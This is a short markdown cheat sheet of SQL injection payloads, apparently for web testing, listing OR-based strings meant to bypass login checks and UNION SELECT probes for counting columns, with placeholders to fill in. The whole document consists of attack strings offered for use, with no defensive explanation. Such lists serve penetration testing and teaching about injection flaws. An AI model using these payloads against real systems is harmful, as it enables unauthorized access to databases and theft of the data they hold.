# SQL Injection Payloads

## OR Payloads
```sql

1'OR1=1#

1 ' OR 1=1#

1 ' OR '1'='1
```

## UNION Payloads

Replace **null** and **table** with a value

```sql

' UNION SELECT null FROM table#

' UNION SELECT null,null FROM table#

' UNION SELECT null,null,null FROM table#
```
